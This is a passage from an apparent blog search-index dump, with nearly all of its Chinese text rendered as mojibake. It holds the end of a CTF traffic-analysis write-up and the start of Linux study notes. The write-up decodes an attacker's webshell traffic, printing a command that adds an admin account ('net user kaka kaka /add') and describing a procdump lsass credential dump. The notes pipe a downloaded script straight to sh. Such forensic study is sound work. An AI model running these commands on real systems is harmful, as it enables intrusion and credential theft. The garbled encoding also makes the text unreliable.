‡ç³»ç»Ÿä¸ºwindowsï¼ŒåŒæ—¶dirå‘½ä»¤æ‰§è¡ŒæˆåŠŸ\næ—¶é—´ä¸ºï¼š`18:37:38.482420`\næ—¢ç„¶è¯¥192.168.2.20çš„æœºå™¨å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œäºæ˜¯æˆ‘æ”¹å˜è¿‡æ»¤æ–¹å¼ï¼ŒæŸ¥çœ‹é»‘å®¢å¦‚ä½•è¿›è¡Œæ”»å‡»\n\n```\nip.addr == 192.168.2.20 && http\n```\nä¸éš¾å‘ç°,é»‘å®¢åˆ©ç”¨echoå‘½ä»¤å†™å…¥äº†ä¸€ä¸ªåä¸ºsh.phpçš„åé—¨\n![](https://img.jwt1399.top//img/20201230115807.png)\n![](https://img.jwt1399.top//img/20201230115815.png)\næˆ‘ä»¬è¿›ä¸€æ­¥è·Ÿè¿›é»‘å®¢æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œç”±äºæ˜¯ä¸­å›½èœåˆ€æµé‡ï¼Œæˆ‘ä»¬é€‰æ‹©æ ¹æ®å›æ˜¾æ˜æ–‡ï¼ŒçŒœæµ‹æŒ‡ä»¤ï¼Œè¿™æ ·æ›´æœ‰æ•ˆç‡\n\n```\nip.src == 192.168.2.20 && http\n```\nåœ¨18:50:09.344660æ—¶ï¼Œæˆ‘ä»¬å‘ç°å¯ç–‘æ“ä½œ,æˆ‘ä»¬å‘ç°ä¸€æ¡å¯ç–‘æ•°æ®ï¼Œåˆ¤æ–­é»‘å®¢åº”è¯¥æ˜¯æ‰§è¡Œäº†`net user`çš„å‘½ä»¤\n\n\n![](https://img.jwt1399.top//img/20201230115829.png)\n\nç„¶ååœ¨18:50:42.908737å‘ç°é»‘å®¢å†æ¬¡æ‰§è¡Œäº†net userå‘½ä»¤\næ­¤æ—¶å›æ˜¾ä¸ºï¼š\n![](https://img.jwt1399.top//img/20201230115842.png)\nçœ‹æ¥é»‘å®¢æˆåŠŸæ·»åŠ äº†ç®¡ç†å‘˜ç”¨æˆ·kaka\nç¡®å®šäº†å¤§è‡´çš„ä½œæ¡ˆæ—¶é—´ï¼Œæˆ‘ä»¬å³å¯ä½¿ç”¨è¿‡æ»¤\n\n```\nip.addr == 192.168.2.20 && http\n```\næ ¹æ®ä¹‹å‰çš„åˆ¤æ–­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“\n18:49:27.767754æ—¶ï¼Œä¸å­˜åœ¨kakaç”¨æˆ·\n18:50:42.908737æ—¶ï¼Œkakaç”¨æˆ·å·²æˆä¸ºç®¡ç†å‘˜\næ‰€ä»¥å¯ä»¥æ–­å®šä½œæ¡ˆæ—¶é—´ç‚¹åœ¨è¿™æ®µæ—¶é—´å†…\n![](https://img.jwt1399.top//img/20201230115857.png)\nåœ¨æ­¤æœŸé—´ï¼Œä¸€å…±4ä¸ªPOSTè¯·æ±‚ï¼Œæˆ‘ä»¬æŒ¨ä¸ªæŸ¥çœ‹ï¼Œæœä¸å…¶ç„¶ï¼Œåœ¨ç¬¬ä¸€ä¸ªPOSTä¸­å°±å‘ç°äº†é—®é¢˜\n\n```\nY2QvZCJDOlxwaHBTdHVkeVxXV1dcYjJldm9sdXRpb25caW5zdGFsbFx0ZXN0XCImbmV0IHVzZXIg\na2FrYSBrYWthIC9hZGQmZWNobyBbU10mY2QmZWNobyBbRV0=\n```\nè§£ç å\n\n```\ncd/d\"C:\\phpStudy\\WWW\\b2evolution\\install\\test\\\"&net user kaka kaka /add&echo [S]&cd&echo [E]\n```\nå¯ä»¥æ˜æ˜¾çœ‹åˆ°\n```\nnet user kaka kaka /add\n```\näºæ˜¯å¯ä»¥æ–­å®šï¼Œç”¨æˆ·åå’Œå¯†ç å‡ä¸º`kaka`\næœ€åä¸€é¢˜æ—¢ç„¶æ˜¯ä¸‹è½½ï¼Œåº”è¯¥æ˜¯åˆ©ç”¨ä¸­å›½èœåˆ€è¿›è¡Œä¸‹è½½äº†ï¼Œé‚£æˆ‘ä»¬åªè¿‡æ»¤å‡ºpostæµé‡ï¼ŒæŸ¥çœ‹å‘½ä»¤å³å¯\n```\nip.dst == 192.168.2.20 && http.request.method==POST\n```\nç„¶åæˆ‘ä»¬åœ¨æ•°æ®åŒ…çš„æœ€åå‘ç°å¦‚ä¸‹æ•°æ®\n![](https://img.jwt1399.top//img/20201230115917.png)\næˆ‘ä»¬å°†å…¶è§£ç \n![](https://img.jwt1399.top//img/20201230115924.png)\nå‘ç°ä½¿ç”¨äº†procdump.exe\nåŒæ—¶å‘ç°æ–‡ä»¶\n![](https://img.jwt1399.top//img/20201230115938.png)\nè§£ç å¾—åˆ°\n![](https://img.jwt1399.top//img/20201230115950.png)\næœ€åæˆ‘ä»¬å¯ä»¥ç¡®å®šï¼Œé»‘å®¢ä¸‹è½½äº†`lsass.exe_180208_185247.dmp`æ–‡ä»¶\n\n##### ç­”æ¡ˆ\n\n```\n1.é»‘å®¢ç¬¬ä¸€æ¬¡è·å–åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨çš„æ¼æ´åˆ©ç”¨è¯·æ±‚å‘ç”Ÿåœ¨ä»€ä¹ˆæ—¶å€™\n18:37:38.482420\n2.é»‘å®¢åœ¨å†…ç½‘ä¸»æœºä¸­æ·»åŠ çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯å¤šå°‘\nkaka:kaka\n3.é»‘å®¢ä»å†…ç½‘æœåŠ¡å™¨ä¸­ä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶å\nlsass.exe_180208_185247.dmp\n```\nå‚è€ƒï¼š\n[CTFæµé‡åˆ†æä¹‹wiresharkä½¿ç”¨](https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&mid=2247489263&amp;idx=1&amp;sn=d9060114d924266ed2bdf4311ca030dd&source=41#wechat_redirect)\n[CTFæµé‡åˆ†æä¹‹é¢˜å‹æ·±åº¦è§£æ](https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&mid=2247489259&amp;idx=1&amp;sn=97faf012f2389dae08407309e3776dd5&source=41#wechat_redirect)\n[CTF| åƒä¸ªé¸¡ï¼Œä¸€èµ·ç ´æµé‡åˆ†æé¢˜å§ï¼](https://mp.weixin.qq.com/s/rS2KSmMIE2DpWKdYuzFdGg)\n[2018å¹´5æœˆ5æ—¥ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ•°æ®èµ›é¢˜è§£](https://skysec.top/2018/05/30/2018.5.5ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ•°æ®èµ›é¢˜è§£/#å‰è¨€)\n\n## èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥èµåŠ©æˆ‘ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>\n\n\n","tags":["æµé‡åˆ†æ"],"categories":["CTF"]},{"title":"Linux å­¦ä¹ ç¬”è®°","url":"//linuxbasic.html","content":"\n## å‰è¨€\n\nç”±äºå¹³å¸¸åšCTFé¢˜ç»å¸¸ä¼šç”¨åˆ°kali linuxï¼Œä½†æ˜¯ä½œä¸ºå®‰å…¨å°èŒæ–°çš„æˆ‘ï¼Œå¯¹linuxç®€ç›´æ˜¯ä¸€æ— æ‰€çŸ¥ï¼ŒæƒŠç¾¡äºå¤§ä½¬ä»…ç”¨å‡ æ¡å‘½ä»¤å°±èƒ½å®ç°å„ç§æ“ä½œï¼Œäºæ˜¯ä¹æˆ‘çš„linuxå­¦ä¹ ä¹‹è·¯å°±æ­¤å¼€å§‹ã€‚\n\n2020.2.24æ›´æ–°ï¼šç”±äºæœ¬ä¸“ä¸šå¼€è®¾äº†`ã€ŠLinuxæ“ä½œç³»ç»Ÿå®‰å…¨ã€‹`è¯¾ï¼Œäºæ˜¯ä¹æœ¬æ–‡æ¡£å¾—åˆ°äº†è¿›ä¸€æ­¥å®Œå–„ã€‚\n\nå­¦ä¹ ç¯å¢ƒï¼šUbuntu 18.04\n\n## æ“ä½œç³»ç»Ÿç®€ä»‹\n\næˆ‘é€šè¿‡ä»¥ä¸‹å››ç‚¹ä»‹ç»ä»€ä¹ˆæ“ä½œç³»ç»Ÿï¼š\n\n*   æ“ä½œç³»ç»Ÿï¼ˆOperation Systemï¼Œç®€ç§°OSï¼‰æ˜¯ç®¡ç†è®¡ç®—æœºç¡¬ä»¶ä¸è½¯ä»¶èµ„æºçš„ç¨‹åºï¼Œæ˜¯è®¡ç®—æœºç³»ç»Ÿçš„å†…æ ¸ä¸åŸºçŸ³ï¼›\n\n*   æ“ä½œç³»ç»Ÿæœ¬è´¨ä¸Šæ˜¯è¿è¡Œåœ¨è®¡ç®—æœºä¸Šçš„è½¯ä»¶ç¨‹åº ï¼›\n\n*   ä¸ºç”¨æˆ·æä¾›ä¸€ä¸ªä¸ç³»ç»Ÿäº¤äº’çš„æ“ä½œç•Œé¢ ï¼›\n\n*   æ“ä½œç³»ç»Ÿåˆ†å†…æ ¸ä¸å¤–å£³ï¼ˆæˆ‘ä»¬å¯ä»¥æŠŠå¤–å£³ç†è§£æˆå›´ç»•ç€å†…æ ¸çš„åº”ç”¨ç¨‹åºï¼Œè€Œå†…æ ¸å°±æ˜¯èƒ½æ“ä½œç¡¬ä»¶çš„ç¨‹åºï¼‰ã€‚\n![](https://i.loli.net/2019/07/26/5d3abff49b3d832580.png)\n\n**æ“ä½œç³»ç»Ÿç®€å•åˆ†ç±»**\n\n*   **Windows:**Â ç›®å‰æœ€æµè¡Œçš„ä¸ªäººæ¡Œé¢æ“ä½œç³»ç»Ÿ\n\n*   **Unixï¼š**Â æœ€æ—©çš„å¤šç”¨æˆ·ã€å¤šä»»åŠ¡æ“ä½œç³»ç»Ÿ .æŒ‰ç…§æ“ä½œç³»ç»Ÿçš„åˆ†ç±»ï¼Œå±äºåˆ†æ—¶æ“ä½œç³»ç»Ÿã€‚Unix å¤§å¤šè¢«ç”¨åœ¨æœåŠ¡å™¨ã€å·¥ä½œç«™ï¼Œç°åœ¨ä¹Ÿæœ‰ç”¨åœ¨ä¸ªäººè®¡ç®—æœºä¸Šã€‚å®ƒåœ¨åˆ›å»ºäº’è”ç½‘ã€è®¡ç®—æœºç½‘ç»œæˆ–å®¢æˆ·ç«¯/æœåŠ¡å™¨æ¨¡å‹æ–¹é¢å‘æŒ¥ç€éå¸¸é‡è¦çš„ä½œç”¨ã€‚\n\n*   **Linux:**Â Linuxæ˜¯ä¸€å¥—å…è´¹ä½¿ç”¨å’Œè‡ªç”±ä¼ æ’­çš„ç±»Unixæ“ä½œç³»ç»Ÿ.Linuxå­˜åœ¨ç€è®¸å¤šä¸åŒçš„Linuxç‰ˆæœ¬ï¼Œä½†å®ƒä»¬éƒ½ä½¿ç”¨äº†Â **Linuxå†…æ ¸**Â ã€‚Linuxå¯å®‰è£…åœ¨å„ç§è®¡ç®—æœºç¡¬ä»¶è®¾å¤‡ä¸­ï¼Œæ¯”å¦‚æ‰‹æœºã€å¹³æ¿ç”µè„‘ã€è·¯ç”±å™¨ã€è§†é¢‘æ¸¸æˆæ§åˆ¶å°ã€å°å¼è®¡ç®—æœºã€å¤§å‹æœºå’Œè¶…çº§è®¡ç®—æœºã€‚ä¸¥æ ¼æ¥è®²ï¼ŒLinuxè¿™ä¸ªè¯æœ¬èº«åªè¡¨ç¤ºLinuxå†…æ ¸ï¼Œä½†å®é™…ä¸Šäººä»¬å·²ç»ä¹ æƒ¯äº†ç”¨Linuxæ¥å½¢å®¹æ•´ä¸ªåŸºäºLinuxå†…æ ¸ï¼Œå¹¶ä¸”ä½¿ç”¨GNU å·¥ç¨‹å„ç§å·¥å…·å’Œæ•°æ®åº“çš„æ“ä½œç³»ç»Ÿã€‚\n\n## æ–‡ä»¶ç³»ç»Ÿç®€ä»‹\n\n**åœ¨Linuxæ“ä½œç³»ç»Ÿä¸­ï¼Œæ‰€æœ‰è¢«æ“ä½œç³»ç»Ÿç®¡ç†çš„èµ„æºï¼Œä¾‹å¦‚ç½‘ç»œæ¥å£å¡ã€ç£ç›˜é©±åŠ¨å™¨ã€æ‰“å°æœºã€è¾“å…¥è¾“å‡ºè®¾å¤‡ã€æ™®é€šæ–‡ä»¶æˆ–æ˜¯ç›®å½•éƒ½è¢«çœ‹ä½œæ˜¯ä¸€ä¸ªæ–‡ä»¶ã€‚**\n\nä¹Ÿå°±æ˜¯è¯´åœ¨LINUXç³»ç»Ÿä¸­æœ‰ä¸€ä¸ªé‡è¦çš„æ¦‚å¿µï¼š**ä¸€åˆ‡éƒ½æ˜¯æ–‡ä»¶**ã€‚å…¶å®è¿™æ˜¯UNIXå“²å­¦çš„ä¸€ä¸ªä½“ç°ï¼Œè€ŒLinuxæ˜¯é‡å†™UNIXè€Œæ¥ï¼Œæ‰€ä»¥è¿™ä¸ªæ¦‚å¿µä¹Ÿå°±ä¼ æ‰¿äº†ä¸‹æ¥ã€‚åœ¨UNIXç³»ç»Ÿä¸­ï¼ŒæŠŠä¸€åˆ‡èµ„æºéƒ½çœ‹ä½œæ˜¯æ–‡ä»¶ï¼ŒåŒ…æ‹¬ç¡¬ä»¶è®¾å¤‡ã€‚UNIXç³»ç»ŸæŠŠæ¯ä¸ªç¡¬ä»¶éƒ½çœ‹æˆæ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œé€šå¸¸ç§°ä¸ºè®¾å¤‡æ–‡ä»¶ï¼Œè¿™æ ·ç”¨æˆ·å°±å¯ä»¥ç”¨è¯»å†™æ–‡ä»¶çš„æ–¹å¼å®ç°å¯¹ç¡¬ä»¶çš„è®¿é—®ã€‚\n\n## æ–‡ä»¶ç±»å‹ä¸ç›®å½•ç»“æ„\n\n### Linuxæ”¯æŒ5ç§æ–‡ä»¶ç±»å‹\n\n![æ–‡ä»¶ç±»å‹](https://i.loli.net/2019/07/26/5d3abfac9119f69728.png)\n\n### Linuxçš„ç›®å½•ç»“æ„\n\nLinuxæ–‡ä»¶ç³»ç»Ÿçš„ç»“æ„å±‚æ¬¡é²œæ˜ï¼Œå°±åƒä¸€æ£µå€’ç«‹çš„æ ‘ï¼Œæœ€é¡¶å±‚æ˜¯å…¶æ ¹ç›®å½•ï¼š\n\n![ç›®å½•ç»“æ„](https://i.loli.net/2019/07/26/5d3abfce940d319974.png)\n\n### å¸¸è§ç›®å½•è¯´æ˜\n\n*   **/binï¼š**Â å­˜æ”¾äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶(ls,cat,mkdirç­‰)ï¼Œå¸¸ç”¨å‘½ä»¤ä¸€èˆ¬éƒ½åœ¨è¿™é‡Œï¼›\n\n*   **/etcï¼š**Â Â å­˜æ”¾ç³»ç»Ÿç®¡ç†å’Œé…ç½®æ–‡ä»¶ï¼›\n\n*   **/homeï¼š**Â Â å­˜æ”¾æ‰€æœ‰ç”¨æˆ·æ–‡ä»¶çš„æ ¹ç›®å½•ï¼Œæ˜¯ç”¨æˆ·ä¸»ç›®å½•çš„åŸºç‚¹ï¼Œæ¯”å¦‚ç”¨æˆ·userçš„ä¸»ç›®å½•å°±æ˜¯/home/userï¼Œå¯ä»¥ç”¨~userè¡¨ç¤ºï¼›\n\n*   **/usr ï¼š**Â ç”¨äºå­˜æ”¾ç³»ç»Ÿåº”ç”¨ç¨‹åºï¼›\n\n*   **/optï¼š**Â é¢å¤–å®‰è£…çš„å¯é€‰åº”ç”¨ç¨‹åºåŒ…æ‰€æ”¾ç½®çš„ä½ç½®ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠtomcatç­‰éƒ½å®‰è£…åˆ°è¿™é‡Œï¼›\n\n*   **/procï¼š**Â Â è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿç›®å½•ï¼Œæ˜¯ç³»ç»Ÿå†…å­˜çš„æ˜ å°„ã€‚å¯ç›´æ¥è®¿é—®è¿™ä¸ªç›®å½•æ¥è·å–ç³»ç»Ÿä¿¡æ¯ï¼›\n\n*   **/rootï¼š** è¶…çº§ç”¨æˆ·ï¼ˆç³»ç»Ÿç®¡ç†å‘˜ï¼‰çš„ä¸»ç›®å½•ï¼ˆç‰¹æƒé˜¶çº§^o^ï¼‰ï¼›\n\n*   **/sbin:** å­˜æ”¾äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ï¼Œåªæœ‰rootæ‰èƒ½è®¿é—®ã€‚è¿™é‡Œå­˜æ”¾çš„æ˜¯ç³»ç»Ÿç®¡ç†å‘˜ä½¿ç”¨çš„ç³»ç»Ÿçº§åˆ«çš„ç®¡ç†å‘½ä»¤å’Œç¨‹åºã€‚å¦‚ifconfigç­‰ï¼›\n\n*   **/devï¼š** ç”¨äºå­˜æ”¾è®¾å¤‡æ–‡ä»¶ï¼›\n\n*   **/mntï¼š** ç³»ç»Ÿç®¡ç†å‘˜å®‰è£…ä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿçš„å®‰è£…ç‚¹ï¼Œç³»ç»Ÿæä¾›è¿™ä¸ªç›®å½•æ˜¯è®©ç”¨æˆ·ä¸´æ—¶æŒ‚è½½å…¶ä»–çš„æ–‡ä»¶ç³»ç»Ÿï¼›\n\n*   **/bootï¼š** å­˜æ”¾ç”¨äºç³»ç»Ÿå¼•å¯¼æ—¶ä½¿ç”¨çš„å„ç§æ–‡ä»¶ï¼›\n\n*   **/lib ï¼š**Â Â  Â  Â å­˜æ”¾ç€å’Œç³»ç»Ÿè¿è¡Œç›¸å…³çš„åº“æ–‡ä»¶ ï¼›\n\n*   **/tmpï¼š** ç”¨äºå­˜æ”¾å„ç§ä¸´æ—¶æ–‡ä»¶ï¼Œæ˜¯å…¬ç”¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç‚¹ï¼›\n\n*   **/varï¼š** ç”¨äºå­˜æ”¾è¿è¡Œæ—¶éœ€è¦æ”¹å˜æ•°æ®çš„æ–‡ä»¶ï¼Œä¹Ÿæ˜¯æŸäº›å¤§æ–‡ä»¶çš„æº¢å‡ºåŒºï¼Œæ¯”æ–¹è¯´å„ç§æœåŠ¡çš„æ—¥å¿—æ–‡ä»¶ï¼ˆç³»ç»Ÿå¯åŠ¨æ—¥å¿—ç­‰ã€‚ï¼‰ç­‰ï¼›\n\n*   **/lost+foundï¼š** è¿™ä¸ªç›®å½•å¹³æ—¶æ˜¯ç©ºçš„ï¼Œç³»ç»Ÿéæ­£å¸¸å…³æœºè€Œç•™ä¸‹â€œæ— å®¶å¯å½’â€çš„æ–‡ä»¶ï¼ˆwindowsä¸‹å«ä»€ä¹ˆ.chkï¼‰å°±åœ¨è¿™é‡Œã€‚  \n##   Ubuntu 18.04 ç¾åŒ–\n\n### å®‰è£…ç¾åŒ–å·¥å…·gnome-tweak-tool\n\n```bash\nsudo apt install gnome-tweak-tool\nsudo apt install gnome-shell-extensions       //æ‰©å±•  \n```\n### å®‰è£…dash to dock ä»»åŠ¡æ ç¾åŒ–\n\n```bash\nsudo apt-get install gnome-shell-extension-dashtodock     \n//å®‰è£…å®Œåé‡å¯\n```\n### ä¸‹è½½ä¸»é¢˜å’Œå›¾æ ‡\n\nç½‘ç«™https://www.gnome-look.org/\nä¸‹è½½å¥½è§£å‹åæ”¾åˆ°å¯¹åº”æ–‡ä»¶å¤¹ä¸‹\n\n```\n/usr/share/themes\n/usr/share/icons\n```\nç„¶åæ‰“å¼€gnome-tweak-tool(ä¼˜åŒ–)é€‰æ‹©è‡ªå·±å–œæ¬¢çš„ä¸»é¢˜å’Œå›¾æ ‡\n\n![ç¾åŒ–å](https://i.loli.net/2020/03/11/xuKrgijEfVkyc1H.png)\n\n### ç»ˆç«¯ç¾åŒ–\n\n**å®‰è£…Oh My Zsh**\n\n```bash\n#å®‰è£…zsh\napt-get install zsh -y\n\n# ä¿®æ”¹é»˜è®¤shellä¸ºzsh\nchsh -s /bin/zsh\n\n#å®‰è£…oh-my-zsh\nwget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh\n\n#ä¿®æ”¹ä¸»é¢˜,æˆ‘ç”¨çš„\"ys\"ä¸»é¢˜\nsudo vim ~/.zshrc\næ‰¾åˆ°ZSH_THEME=\"robbyrussell\"ï¼Œä¿®æ”¹ä¸ºï¼šZSH_THEME=\"ys\"ï¼›\n\n#ç”Ÿæ•ˆï¼š\nsource ~/.zshrc\n\n#è¿˜å¯ä»¥å®‰è£…ä¸€äº›æ’ä»¶ï¼Œæˆ‘å°±ä¸èµ˜è¿°äº†ï¼Œç™¾åº¦ä¸€å¤§å †\n```\n\n### è‡ªå®šä¹‰é…è‰²\n\næ‰“å¼€ç»ˆç«¯é€‰æ‹©é¦–é€‰é¡¹ï¼Œæˆ‘çš„é…è‰²æ˜¯æˆ‘è‡ªå·±è°ƒé…çš„\n\n![ç»ˆç«¯é…è‰²](https://i.loli.net/2020/04/13/jQNV58CTRb9vFkD.png)\n\n![ç¾åŒ–å](https://i.loli.net/2020/04/13/q4kBpujszaHe3ET.png)\n\n## å¿«æ·é”®æ“ä½œ\n\n```bash\nCtrl+Alt+F1:Ubuntuè¿›å…¥çº¯å‘½ä»¤æ¨¡å¼\nCtrl+Alt+F7:Ubuntuè¿›å…¥å›¾å½¢ç•Œé¢æ¨¡å¼\nCtrl+l:åœ¨æ–‡ä»¶å¤¹ä¸­æŸ¥çœ‹æ–‡ä»¶ç›®å½•\nCtrl+h:æŸ¥çœ‹æ–‡ä»¶å¤¹ä¸­éšè—æ–‡ä»¶\n\n#å‘½ä»¤è¡Œçš„å¿«æ·é”®\nCtrl -:ç»ˆç«¯ç¼©å°\nCtrl Shift+:ç»ˆç«¯æ”¾å¤§\nCtrl+r:æœç´¢ä½ ä½¿ç”¨è¿‡çš„å‘½ä»¤ #histotyæ‰“å°ä½ ä½¿ç”¨è¿‡çš„å‘½ä»¤\nCtrl+l:å‘½ä»¤è¡Œæ¸…å±        #æˆ–è€…ç”¨clear  \nCtrl+e:å…‰æ ‡å¿«é€Ÿç§»åˆ°è¡Œå°¾\nCtrl+z:æŠŠå‘½ä»¤æ”¾å…¥åå°\nCtrl+c:å¼ºåˆ¶ç»ˆæ­¢å½“å‰å‘½ä»¤\n\nå¼€æœºé»˜è®¤çº¯å‘½ä»¤æ¨¡å¼\n cd /etc/default  \n sudo gedit grub \nå°†#GRUB_TERMINAL=consoleä¸­çš„#å»æ‰\n```\n## åŸºç¡€å‘½ä»¤\n\n>Linuxå‘½ä»¤å¤§å…¨:[èœé¸Ÿæ•™ç¨‹](https://www.runoob.com/linux/linux-command-manual.html)\nLinuxå‘½ä»¤å¿«é€ŸæŸ¥è¯¢ï¼šman.linuxde.net/\n\n\n### åˆ‡æ¢ç›®å½•å‘½ä»¤\n\n```bash\ncd usrï¼š\tåˆ‡æ¢åˆ°è¯¥ç›®å½•ä¸‹usrç›®å½•\n\ncd ..ï¼ˆæˆ–cd../ï¼‰ï¼š\tåˆ‡æ¢åˆ°ä¸Šä¸€å±‚ç›®å½•\n\ncd ../.. :         åˆ‡æ¢åˆ°ä¸Šä¸Šå±‚ç›®å½•\n\ncd /ï¼š\tåˆ‡æ¢åˆ°ç³»ç»Ÿæ ¹ç›®å½•\n\ncd ~ï¼š\tåˆ‡æ¢åˆ°ç”¨æˆ·ä¸»ç›®å½•\n\ncd -ï¼š\tåˆ‡æ¢åˆ°ä¸Šä¸€ä¸ªæ‰€åœ¨ç›®å½•\n```\n\n### ç›®å½•çš„æ“ä½œå‘½ä»¤\n\n```bash\n1 mkdir ç›®å½•åç§°ï¼šæ–°å»ºç›®å½•  -p åˆ›å»ºå¤šçº§ç›®å½• \neg:mkdir test1/t1/t2\n\n2 lsæˆ–è€…llï¼ˆllæ˜¯ls -lçš„ç¼©å†™ï¼Œllå‘½ä»¤ä»¥çœ‹åˆ°è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯ï¼‰ï¼šæŸ¥çœ‹ç›®å½•ä¿¡æ¯\n\n3 find ç›®å½• å‚æ•°ï¼šå¯»æ‰¾ç›®å½•ï¼ˆæŸ¥ï¼‰\n\nç¤ºä¾‹ï¼š \nåˆ—å‡ºå½“å‰ç›®å½•åŠå­ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹: find . \nåœ¨/homeç›®å½•ä¸‹æŸ¥æ‰¾ä»¥.txtç»“å°¾çš„æ–‡ä»¶å:find /home -name \"*.txt\" \n\nåŒä¸Šï¼Œä½†å¿½ç•¥å¤§å°å†™: find /home -iname \"*.txt\" \n\nå½“å‰ç›®å½•åŠå­ç›®å½•ä¸‹æŸ¥æ‰¾æ‰€æœ‰ä»¥.txtå’Œ.pdfç»“å°¾çš„æ–‡ä»¶:find . \\( -name \"*.txt\" -o -name \"*.pdf\" \\)æˆ–find . -name \"*.txt\" -o -name \"*.pdf\"  # -0 æˆ–è€…(-or)\n\næ ¹æ®æ–‡ä»¶ç±»å‹è¿›è¡Œæœç´¢find . -type ç±»å‹å‚æ•°\n  \n4 mv ç›®å½•åç§° æ–°ç›®å½•åç§°ï¼šä¿®æ”¹ç›®å½•çš„åç§°ï¼ˆæ”¹ï¼‰ \n\næ³¨æ„ï¼šmvçš„è¯­æ³•ä¸ä»…å¯ä»¥å¯¹ç›®å½•è¿›è¡Œé‡å‘½åè€Œä¸”ä¹Ÿå¯ä»¥å¯¹å„ç§æ–‡ä»¶ï¼Œå‹ç¼©åŒ…ç­‰è¿›è¡Œ é‡å‘½åçš„æ“ä½œã€‚mvå‘½ä»¤ç”¨æ¥å¯¹æ–‡ä»¶æˆ–ç›®å½•é‡æ–°å‘½åï¼Œæˆ–è€…å°†æ–‡ä»¶ä»ä¸€ä¸ªç›®å½•ç§»åˆ°å¦ä¸€ä¸ªç›®å½•ä¸­ã€‚åé¢ä¼šä»‹ç»åˆ°mvå‘½ä»¤çš„å¦ä¸€ä¸ªç”¨æ³•ã€‚\n\n5 mv ç›®å½•åç§° ç›®å½•çš„æ–°ä½ç½®ï¼šç§»åŠ¨ç›®å½•çš„ä½ç½®---å‰ªåˆ‡ï¼ˆæ”¹ï¼‰ \n\næ³¨æ„ï¼šmvè¯­æ³•ä¸ä»…å¯ä»¥å¯¹ç›®å½•è¿›è¡Œå‰ªåˆ‡æ“ä½œï¼Œå¯¹æ–‡ä»¶å’Œå‹ç¼©åŒ…ç­‰éƒ½å¯æ‰§è¡Œå‰ªåˆ‡æ“ä½œã€‚å¦å¤–mvä¸cpçš„ç»“æœä¸åŒï¼Œmvå¥½åƒæ–‡ä»¶â€œæ¬å®¶â€ï¼Œæ–‡ä»¶ä¸ªæ•°å¹¶æœªå¢åŠ ã€‚è€Œcpå¯¹æ–‡ä»¶è¿›è¡Œå¤åˆ¶ï¼Œæ–‡ä»¶ä¸ªæ•°å¢åŠ äº†ã€‚\n\n6 cp -r ç›®å½•åç§° ç›®å½•æ‹·è´çš„ç›®æ ‡ä½ç½®ï¼šæ‹·è´ç›®å½•ï¼ˆæ”¹ï¼‰ï¼Œ-rä»£è¡¨é€’å½’æ‹·è´ \n\næ³¨æ„ï¼šcpå‘½ä»¤ä¸ä»…å¯ä»¥æ‹·è´ç›®å½•è¿˜å¯ä»¥æ‹·è´æ–‡ä»¶ï¼Œå‹ç¼©åŒ…ç­‰ï¼Œæ‹·è´æ–‡ä»¶å’Œå‹ç¼©åŒ…æ—¶ä¸ ç”¨å†™-ré€’å½’\n\n7 rm [-rf] ç›®å½•: åˆ é™¤ç›®å½•ï¼ˆåˆ ï¼‰ \n\næ³¨æ„ï¼šrmä¸ä»…å¯ä»¥åˆ é™¤ç›®å½•ï¼Œä¹Ÿå¯ä»¥åˆ é™¤å…¶ä»–æ–‡ä»¶æˆ–å‹ç¼©åŒ…ï¼Œä¸ºäº†å¢å¼ºå¤§å®¶çš„è®°å¿†ï¼Œ æ— è®ºåˆ é™¤ä»»ä½•ç›®å½•æˆ–æ–‡ä»¶ï¼Œéƒ½ç›´æ¥ä½¿ç”¨rm -rf ç›®å½•/æ–‡ä»¶/å‹ç¼©åŒ…\n```\n\n### grepæœç´¢å‘½ä»¤\n\n> **grep**ï¼ˆglobal search regular expression(RE) and print out the lineï¼Œå…¨é¢æœç´¢æ­£åˆ™è¡¨è¾¾å¼å¹¶æŠŠè¡Œæ‰“å°å‡ºæ¥ï¼‰æ˜¯ä¸€ç§å¼ºå¤§çš„æ–‡æœ¬æœç´¢å·¥å…·ï¼Œå®ƒèƒ½ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æœç´¢æ–‡æœ¬ï¼Œå¹¶æŠŠåŒ¹é…çš„è¡Œæ‰“å°å‡ºæ¥ã€‚\né€‰é¡¹ï¼š\n```bash\n-a ä¸è¦å¿½ç•¥äºŒè¿›åˆ¶æ•°æ®ã€‚\n-A<æ˜¾ç¤ºåˆ—æ•°> é™¤äº†æ˜¾ç¤ºç¬¦åˆèŒƒæœ¬æ 